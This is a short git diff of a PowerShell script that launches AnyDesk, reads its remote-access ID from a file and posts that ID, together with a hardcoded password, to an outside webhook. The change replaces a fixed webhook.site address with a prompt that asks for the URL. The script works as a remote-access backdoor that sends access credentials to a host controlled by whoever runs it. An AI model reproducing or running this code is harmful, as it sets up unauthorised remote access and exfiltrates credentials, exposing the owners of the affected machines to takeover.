@@ -13,7 +13,7 @@ Start-Process -FilePath "C:\Program Files (x86)\AnyDesk\AnyDesk.exe" -ArgumentLi
 
 $ID = Get-Content -Path "C:\Program Files (x86)\AnyDesk\AnyDesk_Output.txt" | ForEach-Object { $_.Trim() }
 
-$webhookUrl = "https://webhook.site/bfbf2c35-ead8-43a2-99b8-a896feac0476"
+$webhookUrl = Read-Host -Prompt 'Input the Webhook URL: '
 
 # Send the request to the webhook
 Invoke-WebRequest -Uri $webhookUrl -Method Post -Body "AnyDesk ID is: $ID AND Password is: Aa123456!"
